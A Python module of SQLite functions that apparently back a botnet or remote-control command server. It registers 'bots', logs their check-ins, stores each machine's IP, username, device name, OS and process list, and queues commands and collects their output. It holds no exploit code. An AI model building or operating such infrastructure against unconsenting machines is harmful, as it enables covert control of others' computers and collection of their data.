import sqlite3 as sql
import time

def add_bot_to_db(conn: sql.Connection, id, checkin, ip="", networkaddresses="", username="", devicename=""):
    cur = conn.cursor()
    cur.execute("SELECT checkin FROM bots WHERE uuid=?", (id,))
    if len(cur.fetchall()) > 0:
        print("Bot already exists: " + id)
        return
    else:
        cur.execute("INSERT INTO bots(uuid, checkin, ip, networkaddresses, username, devicename, commandqueue, commandout) VALUES(?, ?, ?, ?, ?, ?, ?, ?)", (id, checkin, ip, networkaddresses, username, devicename, "", ""))
        conn.commit()
        print("Added: " + id + " " + str(checkin))
        return


def checkin(conn: sql.Connection, id):
    cur = conn.cursor()
    checkin = int(time.time())
    cur.execute('''UPDATE bots SET checkin=? WHERE uuid=?''', (checkin, id))
    cur.fetchall()
    conn.commit()
    print("Checkin logged: " + id + " " + str(checkin))


def update_proclist(conn: sql.Connection, id, procstring):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET processlist = ? WHERE uuid=?", (procstring, id))
    conn.commit()


def update_ip(conn: sql.Connection, id, ip):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET ip = ? WHERE uuid=?", (ip, id))
    conn.commit()


def update_os(conn: sql.Connection, id, os):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET os = ? WHERE uuid=?", (os, id))
    conn.commit()


def update_networkaddresses(conn: sql.Connection, id, networkaddresses):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET networkaddresses = ? WHERE uuid=?", (networkaddresses, id))
    conn.commit()


def update_username(conn: sql.Connection, id, username):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET username = ? WHERE uuid=?", (username, id))
    conn.commit()


def update_devicename(conn: sql.Connection, id, devicename):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET devicename = ? WHERE uuid=?", (devicename, id))
    conn.commit()


def update_region(conn: sql.Connection, id, region):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET region = ? WHERE uuid=?", (region, id))
    conn.commit()


def update_memory(conn: sql.Connection, id, memory):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET memory = ? WHERE uuid=?", (int(memory), id))
    conn.commit()


def update_commandqueue(conn: sql.Connection, id, cmd):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET commandqueue = ? WHERE uuid=?", (cmd, id))
    conn.commit()


def update_commandout(conn: sql.Connection, id, cmdout):
    cur = conn.cursor()
    cur.execute("UPDATE bots SET commandout = ? WHERE uuid=?", (cmdout, id))
    conn.commit()